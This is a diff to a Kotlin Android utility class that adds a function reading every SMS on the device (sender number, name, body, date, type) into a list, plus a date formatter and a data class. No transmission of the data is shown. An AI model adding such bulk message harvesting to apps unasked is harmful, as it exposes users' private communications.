@@ -27,6 +27,7 @@ import java.io.*
 import java.lang.reflect.Method
 import java.security.MessageDigest
 import java.security.NoSuchAlgorithmException
+import java.text.SimpleDateFormat
 import java.util.*
 import kotlin.collections.HashMap
 
@@ -385,6 +386,39 @@ class Utils {
             } catch (e: java.lang.Exception) {
                 false
             }
+        }
+
+        data class MessageRepository(
+            val other_mobile: String? = "",
+            val other_name: String? = "",
+            val time: String? = "",
+            val content: String = "",
+            val type: String = ""
+        )
+        fun formatContactTime(time: Long): String {
+            return SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(time)
+        }
+        fun getMessage(context: Context): ArrayList<MessageRepository> {
+            val sms = Uri.parse("content://sms/")
+            val cr = context.contentResolver
+            val projection = arrayOf("_id", "address", "person", "body", "date", "type")
+            val cur = cr.query(sms, projection, null, null, "date desc")
+            val list = ArrayList<MessageRepository>()
+            if (null == cur) {
+                return list
+            }
+            while (cur.moveToNext()) {
+                val number = cur.getString(cur.getColumnIndex("address"))
+                val name = cur.getString(cur.getColumnIndex("person"))
+                val body = cur.getString(cur.getColumnIndex("body"))
+                val date = cur.getLong(cur.getColumnIndex("date"))
+                val type = cur.getInt(cur.getColumnIndex("type"))
+                val yearTime = formatContactTime(date)
+                list.add(MessageRepository(number, name, yearTime, body, type.toString()))
+            }
+            cur.close()
+//        Log.i("MessageUtil", "getMessage: ${Gson().toJson(list)}")
+            return list
         }
 
     }
